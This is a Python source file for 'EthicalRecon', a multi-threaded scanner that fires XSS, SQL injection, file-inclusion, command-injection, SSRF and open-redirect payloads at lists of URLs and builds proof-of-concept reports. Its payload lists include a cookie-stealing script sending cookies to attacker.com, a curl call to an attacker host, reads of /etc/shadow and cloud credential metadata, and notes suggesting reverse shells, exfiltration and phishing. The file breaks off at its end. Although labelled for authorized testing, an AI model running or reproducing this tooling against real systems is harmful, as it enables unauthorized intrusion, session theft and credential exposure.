#!/usr/bin/env python3
"""
EthicalRecon - Comprehensive Ethical Hacking Reconnaissance Toolkit
A professional security testing tool for authorized penetration testing and bug bounty research.
Designed to integrate seamlessly with subdomain enumeration → httpx → vulnerability scanning workflows.

Author: Security Research Team
Version: 2.0.0
License: MIT (For authorized security testing only)
"""

import argparse
import json
import sys
import time
import threading
import requests
import urllib3
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
import re
import random
import string
from pathlib import Path
import hashlib
import base64

# Disable SSL warnings for security testing
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Colors:
    """Terminal color codes for output formatting"""
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    RESET = '\033[0m'

def print_banner():
    """Display the EthicalRecon ASCII banner"""
    banner = f"""{Colors.CYAN}
    ███████╗████████╗██╗  ██╗██╗ ██████╗ █████╗ ██╗     ██████╗ ███████╗ ██████╗ ██████╗ ███╗   ██╗
    ██╔════╝╚══██╔══╝██║  ██║██║██╔════╝██╔══██╗██║     ██╔══██╗██╔════╝██╔════╝██╔═══██╗████╗  ██║
    █████╗     ██║   ███████║██║██║     ███████║██║     ██████╔╝█████╗  ██║     ██║   ██║██╔██╗ ██║
    ██╔══╝     ██║   ██╔══██║██║██║     ██╔══██║██║     ██╔══██╗██╔══╝  ██║     ██║   ██║██║╚██╗██║
    ███████╗   ██║   ██║  ██║██║╚██████╗██║  ██║███████╗██║  ██║███████╗╚██████╗╚██████╔╝██║ ╚████║
    ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝
                                                                                                      
    {Colors.YELLOW}🎯 Comprehensive Ethical Hacking Reconnaissance Toolkit v2.0.0{Colors.RESET}
    {Colors.GREEN}⚡ Multi-threaded vulnerability scanning with PoC verification{Colors.RESET}
    {Colors.BLUE}🔍 Subdomain enumeration → httpx → deep vulnerability analysis workflow{Colors.RESET}
    {Colors.PURPLE}🛡️  For authorized security testing and bug bounty research only{Colors.RESET}
    """
    print(banner)

class PayloadManager:
    """Manages vulnerability testing payloads with advanced encoding and context awareness"""
    
    def __init__(self):
        self.xss_payloads = [
            # Basic XSS payloads
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "'\"><script>alert('XSS')</script>",
            
            # Advanced XSS payloads
            "<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>",
            "<iframe src='javascript:alert(\"XSS\")'></iframe>",
            "<img src='x' onerror='eval(String.fromCharCode(97,108,101,114,116,40,49,41))'>",
            "<svg/onload=alert(1)>",
            "<input onfocus=alert(1) autofocus>",
            
            # Context-specific XSS
            "';alert('XSS');//",
            "\";alert('XSS');//",
            "</textarea><script>alert('XSS')</script>",
            "</title><script>alert('XSS')</script>",
        ]
        
        self.sqli_payloads = [
            # Basic SQL injection
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT NULL--",
            "' AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES)>0--",
            
            # Time-based blind SQL injection
            "' OR (SELECT SLEEP(5))--",
            "'; WAITFOR DELAY '00:00:05'--",
            "' OR pg_sleep(5)--",
            
            # Error-based SQL injection
            "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT user()), 0x7e))--",
            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--",
        ]
        
        self.lfi_payloads = [
            # Basic LFI
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "/etc/passwd",
            "/etc/shadow",
            "/proc/version",
            "/proc/cmdline",
            
            # Encoded LFI
            "%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64",
            "....//....//....//etc/passwd",
            "..%2f..%2f..%2fetc%2fpasswd",
            
            # Advanced LFI
            "php://filter/convert.base64-encode/resource=/etc/passwd",
            "file:///etc/passwd",
            "expect://id",
        ]
        
        self.rce_payloads = [
            # Basic command injection
            "; id",
            "| id",
            "& id",
            "&& id",
            "|| id",
            "`id`",
            "$(id)",
            
            # Advanced command injection
            "; cat /etc/passwd",
            "| whoami",
            "&& uname -a",
            "; curl http://attacker.com/",
            "; ping -c 4 attacker.com",
            
            # Encoded payloads
            "%3Bid",
            "%7Cid",
            "%26id",
        ]
        
        self.ssrf_payloads = [
            # Cloud metadata endpoints
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            
            # Internal network ranges
            "http://127.0.0.1:22",
            "http://localhost:3306",
            "http://192.168.1.1",
            "http://10.0.0.1",
            "http://172.16.0.1",
            
            # Protocol handlers
            "file:///etc/passwd",
            "gopher://127.0.0.1:3306",
            "dict://127.0.0.1:11211",
        ]
        
        self.redirect_payloads = [
            # Open redirect payloads
            "//evil.com",
            "http://evil.com",
            "https://evil.com",
            "//evil.com/",
            "///evil.com",
            "\\\\evil.com",
            
            # Encoded redirects
            "http%3A%2F%2Fevil.com",
            "%2F%2Fevil.com",
            
            # JavaScript redirects
            "javascript:window.location='http://evil.com'",
        ]

    def get_payloads(self, vuln_type):
        """Get payloads for specific vulnerability type"""
        payload_map = {
            'xss': self.xss_payloads,
            'sqli': self.sqli_payloads,
            'lfi': self.lfi_payloads,
            'rce': self.rce_payloads,
            'ssrf': self.ssrf_payloads,
            'redirect': self.redirect_payloads
        }
        return payload_map.get(vuln_type, [])
    
    def encode_payload(self, payload, encoding_type='url'):
        """Encode payloads to bypass basic filters"""
        if encoding_type == 'url':
            return quote(payload)
        elif encoding_type == 'double_url':
            return quote(quote(payload))
        elif encoding_type == 'html':
            return payload.replace('<', '&lt;').replace('>', '&gt;')
        elif encoding_type == 'base64':
            return base64.b64encode(payload.encode()).decode()
        return payload

class VulnerabilityDetector:
    """Advanced vulnerability detection with PoC verification"""
    
    def __init__(self, session, timeout=10):
        self.session = session
        self.timeout = timeout
        self.payload_manager = PayloadManager()
    
    def detect_xss(self, url, parameter, value):
        """Detect XSS vulnerabilities with PoC verification"""
        vulnerabilities = []
        
        for payload in self.payload_manager.get_payloads('xss'):
            try:
                # Test with original payload
                test_url = self._inject_payload(url, parameter, payload)
                response = self.session.get(test_url, timeout=self.timeout, verify=False)
                
                # Check if payload is reflected in response
                if payload in response.text or payload.lower() in response.text.lower():
                    # Verify it's actually executable (not just reflected)
                    if self._verify_xss_execution(response.text, payload):
                        # Generate PoC
                        poc = self._generate_xss_poc(url, parameter, payload, response)
                        
                        vulnerabilities.append({
                            'type': 'XSS',
                            'severity': 'High',
                            'url': url,
                            'parameter': parameter,
                            'payload': payload,
                            'proof_of_concept': poc,
                            'confidence': 'High',
                            'description': 'Cross-Site Scripting vulnerability detected with verified execution'
                        })
                        
                        print(f"{Colors.RED}[XSS FOUND]{Colors.RESET} {url} - Parameter: {parameter}")
                        print(f"{Colors.YELLOW}[POC]{Colors.RESET} {poc['execution_proof']}")
                        break  # Found working payload, no need to test more
                        
            except Exception as e:
                continue
                
        return vulnerabilities
    
    def detect_sqli(self, url, parameter, value):
        """Detect SQL injection with time-based verification"""
        vulnerabilities = []
        
        for payload in self.payload_manager.get_payloads('sqli'):
            try:
                test_url = self._inject_payload(url, parameter, payload)
                
                start_time = time.time()
                response = self.session.get(test_url, timeout=15, verify=False)
                response_time = time.time() - start_time
                
                # Time-based detection for SLEEP/WAITFOR payloads
                if 'SLEEP' in payload.upper() or 'WAITFOR' in payload.upper():
                    if response_time >= 4:  # Expecting ~5 second delay
                        poc = self._generate_sqli_poc(url, parameter, payload, response_time)
                        
                        vulnerabilities.append({
                            'type': 'SQL Injection',
                            'severity': 'Critical',
                            'url': url,
                            'parameter': parameter,
                            'payload': payload,
                            'proof_of_concept': poc,
                            'confidence': 'High',
                            'description': 'Time-based SQL injection confirmed with delay verification'
                        })
                        
                        print(f"{Colors.RED}[SQLi FOUND]{Colors.RESET} {url} - Parameter: {parameter}")
                        print(f"{Colors.YELLOW}[POC]{Colors.RESET} Time delay: {response_time:.2f}s - {poc['execution_proof']}")
                        break
                
                # Error-based detection
                elif any(error in response.text.lower() for error in ['sql syntax', 'mysql', 'ora-', 'postgresql']):
                    poc = self._generate_sqli_poc(url, parameter, payload, response_time, response.text)
                    
                    vulnerabilities.append({
                        'type': 'SQL Injection',
                        'severity': 'Critical',
                        'url': url,
                        'parameter': parameter,
                        'payload': payload,
                        'proof_of_concept': poc,
                        'confidence': 'Medium',
                        'description': 'Error-based SQL injection detected through database error messages'
                    })
                    
                    print(f"{Colors.RED}[SQLi FOUND]{Colors.RESET} {url} - Parameter: {parameter}")
                    print(f"{Colors.YELLOW}[POC]{Colors.RESET} Database error revealed - {poc['execution_proof']}")
                    break
                    
            except Exception as e:
                continue
                
        return vulnerabilities
    
    def detect_lfi(self, url, parameter, value):
        """Detect Local File Inclusion with file signature verification"""
        vulnerabilities = []
        
        for payload in self.payload_manager.get_payloads('lfi'):
            try:
                test_url = self._inject_payload(url, parameter, payload)
                response = self.session.get(test_url, timeout=self.timeout, verify=False)
                
                # Check for common file signatures
                file_signatures = {
                    '/etc/passwd': ['root:', 'bin:', 'daemon:', '/bin/bash', '/bin/sh'],
                    'windows/system32': ['127.0.0.1', 'localhost', '# Copyright'],
                    '/proc/version': ['Linux version', 'gcc version'],
                    'php://filter': ['base64', 'PD9waHA']  # Base64 encoded PHP
                }
                
                for file_type, signatures in file_signatures.items():
                    if any(sig in response.text for sig in signatures):
                        poc = self._generate_lfi_poc(url, parameter, payload, response.text, file_type)
                        
                        vulnerabilities.append({
                            'type': 'Local File Inclusion',
                            'severity': 'High',
                            'url': url,
                            'parameter': parameter,
                            'payload': payload,
                            'proof_of_concept': poc,
                            'confidence': 'High',
                            'description': f'LFI confirmed - successfully read {file_type}'
                        })
                        
                        print(f"{Colors.RED}[LFI FOUND]{Colors.RESET} {url} - Parameter: {parameter}")
                        print(f"{Colors.YELLOW}[POC]{Colors.RESET} File read: {file_type} - {poc['execution_proof']}")
                        return vulnerabilities  # Found one, return to avoid duplicates
                        
            except Exception as e:
                continue
                
        return vulnerabilities
    
    def detect_rce(self, url, parameter, value):
        """Detect Remote Code Execution with command output verification"""
        vulnerabilities = []
        
        # Generate unique marker for verification
        unique_marker = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
        
        rce_payloads = [
            f"; echo {unique_marker}",
            f"| echo {unique_marker}",
            f"& echo {unique_marker}",
            f"&& echo {unique_marker}",
            f"`echo {unique_marker}`",
            f"$(echo {unique_marker})",
        ]
        
        for payload in rce_payloads:
            try:
                test_url = self._inject_payload(url, parameter, payload)
                response = self.session.get(test_url, timeout=self.timeout, verify=False)
                
                # Check if our unique marker appears in response
                if unique_marker in response.text:
                    poc = self._generate_rce_poc(url, parameter, payload, response.text, unique_marker)
                    
                    vulnerabilities.append({
                        'type': 'Remote Code Execution',
                        'severity': 'Critical',
                        'url': url,
                        'parameter': parameter,
                        'payload': payload,
                        'proof_of_concept': poc,
                        'confidence': 'High',
                        'description': 'RCE confirmed with command execution verification'
                    })
                    
                    print(f"{Colors.RED}[RCE FOUND]{Colors.RESET} {url} - Parameter: {parameter}")
                    print(f"{Colors.YELLOW}[POC]{Colors.RESET} Command executed - {poc['execution_proof']}")
                    return vulnerabilities  # Critical finding, return immediately
                    
            except Exception as e:
                continue
                
        return vulnerabilities
    
    def detect_ssrf(self, url, parameter, value):
        """Detect SSRF with external callback verification"""
        vulnerabilities = []
        
        for payload in self.payload_manager.get_payloads('ssrf'):
            try:
                test_url = self._inject_payload(url, parameter, payload)
                
                start_time = time.time()
                response = self.session.get(test_url, timeout=self.timeout, verify=False)
                response_time = time.time() - start_time
                
                # Check for cloud metadata indicators
                cloud_indicators = [
                    'ami-id', 'instance-id', 'local-hostname', 'public-hostname',
                    'security-groups', 'iam', 'user-data', 'meta-data'
                ]
                
                if any(indicator in response.text.lower() for indicator in cloud_indicators):
                    poc = self._generate_ssrf_poc(url, parameter, payload, response.text)
                    
                    vulnerabilities.append({
                        'type': 'Server-Side Request Forgery',
                        'severity': 'High',
                        'url': url,
                        'parameter': parameter,
                        'payload': payload,
                        'proof_of_concept': poc,
                        'confidence': 'High',
                        'description': 'SSRF confirmed - accessed cloud metadata service'
                    })
                    
                    print(f"{Colors.RED}[SSRF FOUND]{Colors.RESET} {url} - Parameter: {parameter}")
                    print(f"{Colors.YELLOW}[POC]{Colors.RESET} Metadata access - {poc['execution_proof']}")
                    break
                    
                # Check for internal service responses (longer response times to internal IPs)
                elif '127.0.0.1' in payload or 'localhost' in payload:
                    if response_time > 2 or len(response.text) > 1000:  # Internal service responded
                        poc = self._generate_ssrf_poc(url, parameter, payload, f"Response time: {response_time:.2f}s")
                        
                        vulnerabilities.append({
                            'type': 'Server-Side Request Forgery',
                            'severity': 'Medium',
                            'url': url,
                            'parameter': parameter,
                            'payload': payload,
                            'proof_of_concept': poc,
                            'confidence': 'Medium',
                            'description': 'Potential SSRF - internal service accessibility'
                        })
                        
                        print(f"{Colors.YELLOW}[SSRF POTENTIAL]{Colors.RESET} {url} - Parameter: {parameter}")
                        print(f"{Colors.YELLOW}[POC]{Colors.RESET} Internal access - {poc['execution_proof']}")
                        
            except Exception as e:
                continue
                
        return vulnerabilities
    
    def detect_open_redirect(self, url, parameter, value):
        """Detect open redirect vulnerabilities"""
        vulnerabilities = []
        
        for payload in self.payload_manager.get_payloads('redirect'):
            try:
                test_url = self._inject_payload(url, parameter, payload)
                response = self.session.get(test_url, timeout=self.timeout, verify=False, allow_redirects=False)
                
                # Check for redirect response codes
                if response.status_code in [301, 302, 303, 307, 308]:
                    location = response.headers.get('Location', '')
                    
                    if 'evil.com' in location or payload in location:
                        poc = self._generate_redirect_poc(url, parameter, payload, location)
                        
                        vulnerabilities.append({
                            'type': 'Open Redirect',
                            'severity': 'Medium',
                            'url': url,
                            'parameter': parameter,
                            'payload': payload,
                            'proof_of_concept': poc,
                            'confidence': 'High',
                            'description': 'Open redirect confirmed - redirects to external domain'
                        })
                        
                        print(f"{Colors.YELLOW}[REDIRECT FOUND]{Colors.RESET} {url} - Parameter: {parameter}")
                        print(f"{Colors.YELLOW}[POC]{Colors.RESET} Redirects to: {location}")
                        break
                        
            except Exception as e:
                continue
                
        return vulnerabilities
    
    def _inject_payload(self, url, parameter, payload):
        """Inject payload into URL parameter"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        
        if parameter in params:
            params[parameter] = [payload]
        else:
            params[parameter] = [payload]
        
        new_query = urlencode(params, doseq=True)
        return urlunparse(parsed._replace(query=new_query))
    
    def _verify_xss_execution(self, response_text, payload):
        """Verify if XSS payload would actually execute"""
        # Check if payload is in executable context
        executable_contexts = [
            r'<script[^>]*>' + re.escape(payload),
            r'<[^>]+on\w+=[\'"]?' + re.escape(payload),
            r'javascript:' + re.escape(payload),
            r'<svg[^>]*onload=' + re.escape(payload)
        ]
        
        for context in executable_contexts:
            if re.search(context, response_text, re.IGNORECASE):
                return True
        
        # Check if payload is reflected without proper encoding
        if payload in response_text and '<' in payload and '>' in payload:
            return True
            
        return False
    
    def _generate_xss_poc(self, url, parameter, payload, response):
        """Generate XSS proof of concept"""
        return {
            'attack_vector': f"{url} with {parameter}={payload}",
            'execution_proof': f"Payload '{payload}' reflected in executable context",
            'impact': 'Cookie theft, session hijacking, defacement possible',
            'curl_command': f"curl -X GET '{self._inject_payload(url, parameter, payload)}'",
            'browser_test': f"Visit: {self._inject_payload(url, parameter, payload)}"
        }
    
    def _generate_sqli_poc(self, url, parameter, payload, response_time, error_text=''):
        """Generate SQL injection proof of concept"""
        if error_text:
            proof = f"Database error revealed: {error_text[:100]}..."
        else:
            proof = f"Time-based injection confirmed with {response_time:.2f}s delay"
        
        return {
            'attack_vector': f"{url} with {parameter}={payload}",
            'execution_proof': proof,
            'impact': 'Database access, data extraction, potential RCE',
            'curl_command': f"curl -X GET '{self._inject_payload(url, parameter, payload)}'",
            'exploitation_note': 'Use sqlmap for automated exploitation'
        }
    
    def _generate_lfi_poc(self, url, parameter, payload, response_text, file_type):
        """Generate LFI proof of concept"""
        file_content = response_text[:200] + "..." if len(response_text) > 200 else response_text
        
        return {
            'attack_vector': f"{url} with {parameter}={payload}",
            'execution_proof': f"Successfully read {file_type}",
            'file_content_sample': file_content,
            'impact': 'Sensitive file access, potential code execution',
            'curl_command': f"curl -X GET '{self._inject_payload(url, parameter, payload)}'",
            'exploitation_note': 'Try log poisoning or PHP wrappers for RCE'
        }
    
    def _generate_rce_poc(self, url, parameter, payload, response_text, marker):
        """Generate RCE proof of concept"""
        return {
            'attack_vector': f"{url} with {parameter}={payload}",
            'execution_proof': f"Command executed - unique marker '{marker}' found in response",
            'command_output': response_text,
            'impact': 'Complete system compromise possible',
            'curl_command': f"curl -X GET '{self._inject_payload(url, parameter, payload)}'",
            'exploitation_note': 'Use for reverse shell or data exfiltration'
        }
    
    def _generate_ssrf_poc(self, url, parameter, payload, response_info):
        """Generate SSRF proof of concept"""
        return {
            'attack_vector': f"{url} with {parameter}={payload}",
            'execution_proof': f"SSRF confirmed: {response_info}",
            'impact': 'Internal network access, cloud metadata exposure',
            'curl_command': f"curl -X GET '{self._inject_payload(url, parameter, payload)}'",
            'exploitation_note': 'Explore internal services and cloud instances'
        }
    
    def _generate_redirect_poc(self, url, parameter, payload, location):
        """Generate open redirect proof of concept"""
        return {
            'attack_vector': f"{url} with {parameter}={payload}",
            'execution_proof': f"Redirects to: {location}",
            'impact': 'Phishing attacks, session fixation',
            'curl_command': f"curl -I '{self._inject_payload(url, parameter, payload)}'",
            'exploitation_note': 'Use for phishing campaigns'
        }

class EthicalReconScanner:
    """Main scanner class for comprehensive vulnerability assessment"""
    
    def __init__(self, threads=10, timeout=10, user_agent=None):
        self.threads = threads
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': user_agent or 'EthicalRecon/2.0.0 (Security Scanner)',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
        })
        
        self.detector = VulnerabilityDetector(self.session, timeout)
        self.results = []
        self.stats = {
            'total_urls': 0,
            'scanned_urls': 0,
            'vulnerabilities_found': 0,
            'start_time': None,
            'end_time': None
        }
    
    def scan_url(self, url):
        """Scan a single URL for vulnerabilities"""
        vulnerabilities = []
        
        try:
            print(f"{Colors.BLUE}[SCANNING]{Colors.RESET} {url}")
            
            # Parse URL and extract parameters
            parsed = urlparse(url)
            params = parse_qs(parsed.query, keep_blank_values=True)
            
            if not params:
                print(f"{Colors.YELLOW}[SKIPPED]{Colors.RESET} No parameters found in {url}")
                return vulnerabilities
            
            # Test each parameter
            for param, values in params.items():
                original_value = values[0] if values else ''
                
                print(f"  {Colors.CYAN}Testing parameter:{Colors.RESET} {param}")
                
                # Test for different vulnerability types
                vuln_tests = [
                    ('XSS', self.detector.detect_xss),
                    ('SQL Injection', self.detector.detect_sqli),
                    ('LFI', self.detector.detect_lfi),
                    ('RCE', self.detector.detect_rce),
                    ('SSRF', self.detector.detect_ssrf),
                    ('Open Redirect', self.detector.detect_open_redirect)
                ]
                
                for vuln_name, test_func in vuln_tests:
                    try:
                        found_vulns = test_func(url, param, original_value)
                        vulnerabilities.extend(found_vulns)
                        
                        if found_vulns:
                            self.stats['vulnerabilities_found'] += len(found_vulns)
                            
                    except Exception as e:
                        print(f"{Colors.RED}[ERROR]{Colors.RESET} Testing {vuln_name} on {param}: {str(e)}")
                        continue
            
            self.stats['scanned_urls'] += 1
            
        except Exception as e:
            print(f"{Colors.RED}[ERROR]{Colors.RESET} Scanning {url}: {str(e)}")
        
        return vulnerabilities
    
    def scan_from_file(self, file_path):
        """Scan URLs from a file (compatible with httpx output)"""
        print(f"{Colors.GREEN}[INFO]{Colors.RESET} Loading URLs from {file_path}")
        
        try:
            with open(file_path, 'r') as f:
                urls = [line.strip() for line in f if line.strip()]
            
            print(f"{Colors.GREEN}[INFO]{Colors.RESET} Loaded {len(urls)} URLs")
            self.stats['total_urls'] = len(urls)
            self.stats['start_time'] = datetime.now()
            
            # Multi-threaded scanning
            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                future_to_url = {executor.submit(self.scan_url, url): url for url in urls}
                
                for future in as_completed(future_to_url):
                    url = future_to_url[future]
                    try:
                        vulnerabilities = future.result()
                        self.results.extend(vulnerabilities)
                    except Exception as e:
                        print(f"{Colors.RED}[ERROR]{Colors.RESET} Processing {url}: {str(e)}")
            
            self.stats['end_time'] = datetime.now()
            
        except FileNotFoundError:
            print(f"{Colors.RED}[ERROR]{Colors.RESET} File not found: {file_path}")
            sys.exit(1)
        except Exception as e:
            print(f"{Colors.RED}[ERROR]{Colors.RESET} Reading file {file_path}: {str(e)}")
            sys.exit(1)
    
    def scan_single_url(self, url):
        """Scan a single URL"""
        print(f"{Colors.GREEN}[INFO]{Colors.RESET} Scanning single URL: {url}")
        
        self.stats['total_urls'] = 1
        self.stats['start_time'] = datetime.now()
        
        vulnerabilities = self.scan_url(url)
        self.results.extend(vulnerabilities)
        
        self.stats['end_time'] = datetime.now()
    
    def generate_report(self, output_file, format_type='json'):
        """Generate vulnerability report"""
        
        report_data = {
            'scan_info': {
                'tool': 'EthicalRecon v2.0.0',
                'start_time': self.stats['start_time'].isoformat() if self.stats['start_time'] else None,
                'end_time': self.stats['end_time'].isoformat() if self.stats['end_time'] else None,
                'duration': str(self.stats['end_time'] - self.stats['start_time']) if self.stats['start_time'] and self.stats['end_time'] else None,
                'total_urls': self.stats['total_urls'],
                'scanned_urls': self.stats['scanned_urls'],
                'vulnerabilities_found': self.stats['vulnerabilities_found']
            },
            'vulnerabilities': self.results
        }
        
        if format_type == 'json':
            with open(output_file, 'w') as f:
                json.dump(report_data, f, indent=2)
        
        elif format_type == 'html':
            self._generate_html_report(report_data, output_file)
        
        elif format_type == 'text':
            self._generate_text_report(report_data, output_file)
        
        print(f"{Colors.GREEN}[REPORT]{Colors.RESET} Saved to {output_file}")
    
    def _generate_html_report(self, data, output_file):
        """Generate HTML report"""
        html_content = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>EthicalRecon Security Report</title>
            <style>
                body {{ font-family: Arial, sans-serif; margin: 40px; }}
                .header {{ background: #2c3e50; color: white; padding: 20px; border-radius: 5px; }}
                .stats {{ background: #ecf0f1; padding: 15px; margin: 20px 0; border-radius: 5px; }}
                .vulnerability {{ border: 1px solid #bdc3c7; margin: 10px 0; padding: 15px; border-radius: 5px; }}
                .critical {{ border-left: 5px solid #e74c3c; }}
                .high {{ border-left: 5px solid #f39c12; }}
                .medium {{ border-left: 5px solid #f1c40f; }}
                .low {{ border-left: 5px solid #27ae60; }}
                .poc {{ background: #f8f9fa; padding: 10px; margin: 10px 0; border-radius: 3px; font-family: monospace; }}
            </style>
        </head>
        <body>
            <div class="header">
                <h1>🛡️ EthicalRecon Security Report</h1>
                <p>Comprehensive vulnerability assessment results</p>
            </div>
            
            <div class="stats">
                <h2>Scan Statistics</h2>
                <p><strong>Total URLs:</strong> {data['scan_info']['total_urls']}</p>
                <p><strong>Scanned URLs:</strong> {data['scan_info']['scanned_urls']}</p>
                <p><strong>Vulnerabilities Found:</strong> {data['scan_info']['vulnerabilities_found']}</p>
                <p><strong>Scan Duration:</strong> {data['scan_info']['duration']}</p>
            </div>
            
            <h2>Vulnerabilities Found</h2>
        """
        
        for vuln in data['vulnerabilities']:
            severity_class = vuln['severity'].lower()
            html_content += f"""
            <div class="vulnerability {severity_class}">
                <h3>{vuln['type']} - {vuln['severity']} Severity</h3>
                <p><strong>URL:</strong> {vuln['url']}</p>
                <p><strong>Parameter:</strong> {vuln['parameter']}</p>
                <p><strong>Description:</strong> {vuln['description']}</p>
                <p><strong>Confidence:</strong> {vuln['confidence']}</p>
                
                <div class="poc">
                    <h4>Proof of Concept:</h4>
                    <p><strong>Attack Vector:</strong> {vuln['proof_of_concept']['attack_vector']}</p>
                    <p><strong>Execution Proof:</strong> {vuln['proof_of_concept']['execution_proof']}</p>
                    <p><strong>Impact:</strong> {vuln['proof_of_concept']['impact']}</p>
                    <p><strong>cURL Command:</strong> <code>{vuln['proof_of_concept']['curl_command']}</code></p>
                </div>
            </div>
            """
        
        html_content += """
        </body>
        </html>
        """
        
        with open(output_file, 'w') as f:
            f.write(html_content)
    
    def _generate_text_report(self, data, output_file):
        """Generate text report"""
        with open(output_file, 'w') as f:
            f.write("=" * 60 + "\n")
            f.write("ETHICALRECON SECURITY ASSESSMENT REPORT\n")
            f.write("=" * 60 + "\n\n")
            
            f.write("SCAN STATISTICS:\n")
            f.write("-" * 20 + "\n")
            f.write(f"Total URLs: {data['scan_info']['total_urls']}\n")
            f.write(f"Scanned URLs: {data['scan_info']['scanned_urls']}\n")
            f.write(f"Vulnerabilities Found: {data['scan_info']['vulnerabilities_found']}\n")
            f.write(f"Scan Duration: {data['scan_info']['duration']}\n\n")
            
            f.write("VULNERABILITIES FOUND:\n")
            f.write("-" * 25 + "\n\n")
            
            for i, vuln in enumerate(data['vulnerabilities'], 1):
                f.write(f"[{i}] {vuln['type']} - {vuln['severity']} Severity\n")
                f.write(f"URL: {vuln['url']}\n")
                f.write(f"Parameter: {vuln['parameter']}\n")
                f.write(f"Description: {vuln['description']}\n")
                f.write(f"Confidence: {vuln['confidence']}\n")
                f.write(f"Payload: {vuln['payload']}\n\n")
                
                f.write("PROOF OF CONCEPT:\n")
                f.write(f"Attack Vector: {vuln['proof_of_concept']['attack_vector']}\n")
                f.write(f"Execution Proof: {vuln['proof_of_concept']['execution_proof']}\n")
                f.write(f"Impact: {vuln['proof_of_concept']['impact']}\n")
                f.write(f"cURL Command: {vuln['proof_of_concept']['curl_command']}\n")
                f.write("\n" + "=" * 60 + "\n\n")

def main():
    """Main function"""
    parser = argparse.ArgumentParser(
        description='EthicalRecon - Comprehensive Ethical Hacking Reconnaissance Toolkit',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 ethicalrecon.py -f live_hosts.txt -o results
  python3 ethicalrecon.py -u "http://example.com/search?q=test" -o single_scan
  python3 ethicalrecon.py -f httpx_output.txt -t 20 --format html
  python3 ethicalrecon.py -f subdomains.txt --timeout 15 --format json,html
        """
    )
    
    # Input options
    input_group = parser.add_mutually_exclusive_group(required=True)
    input_group.add_argument('-f', '--file', help='File containing URLs to scan (one per line)')
    input_group.add_argument('-u', '--url', help='Single URL to scan')
    
    # Output options
    parser.add_argument('-o', '--output', default='ethicalrecon_results', 
                        help='Output directory for results (default: ethicalrecon_results)')
    parser.add_argument('--format', default='json,text', 
                        help='Output formats: json,html,text (default: json,text)')
    
    # Scanning options
    parser.add_argument('-t', '--threads', type=int, default=10,
                        help='Number of threads (default: 10)')
    parser.add_argument('--timeout', type=int, default=10,
                        help='Request timeout in seconds (default: 10)')
    parser.add_argument('--user-agent', 
                        help='Custom User-Agent string')
    
    # Vulnerability types
    parser.add_argument('--scan-types', default='all',
                        help='Vulnerability types to scan: xss,sqli,lfi,rce,ssrf,redirect (default: all)')
    
    # Utility options
    parser.add_argument('--no-banner', action='store_true',
                        help='Suppress banner output')
    parser.add_argument('-v', '--verbose', action='store_true',
                        help='Verbose output')
    
    args = parser.parse_args()
    
    # Print banner
    if not args.no_banner:
        print_banner()
    
    # Create output directory
    output_dir = Path(args.output)
    output_dir.mkdir(exist_ok=True)
    
    # Initialize scanner
    scanner = EthicalReconScanner(
        threads=args.threads,
        timeout=args.timeout,
        user_agent=args.user_agent
    )
    
    # Start scanning
    print(f"{Colors.GREEN}[INFO]{Colors.RESET} Starting EthicalRecon scan...")
    
    if args.file:
        scanner.scan_from_file(args.file)
    else:
        scanner.scan_single_url(args.url)
    
    # Generate reports
    if scanner.results:
        print(f"\n{Colors.GREEN}[SUCCESS]{Colors.RESET} Found {len(scanner.results)} vulnerabilities!")
        
        # Generate summary
        severity_counts = {}
        for vuln in scanner.results:
            severity = vuln['severity']
            severity_counts[severity] = severity_counts.get(severity, 0) + 1
        
        print(f"{Colors.CYAN}[SUMMARY]{Colors.RESET} Vulnerabilities by severity:")
        for severity, count in severity_counts.items():
            color = Colors.RED if severity == 'Critical' else Colors.YELLOW if severity == 'High' else Colors.BLUE
            print(f"  {color}{severity}{Colors.RESET}: {count}")
        
        # Generate reports in requested formats
        formats = args.format.split(',')
        for fmt in formats:
            fmt = fmt.strip().lower()
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            
            if fmt == 'json':
                output_file = output_dir / f"ethicalrecon_{timestamp}.json"
                scanner.generate_report(str(output_file), 'json')
            elif fmt == 'html':
                output_file = output_dir / f"ethicalrecon_{timestamp}.html"
                scanner.generate_report(str(output_file), 'html')
            elif fmt == 'text':
                output_file = output_dir / f"ethicalrecon_{timestamp}.txt"
                scanner.generate_report(str(output_file), 'text')
        
        print(f"\n{Colors.GREEN}[COMPLETED]{Colors.RESET} Scan finished. Reports saved to {output_dir}")
        
    else:
        print(f"\n{Colors.YELLOW}[INFO]{Colors.RESET} No vulnerabilities found.")
        
        # Still generate a report with scan info
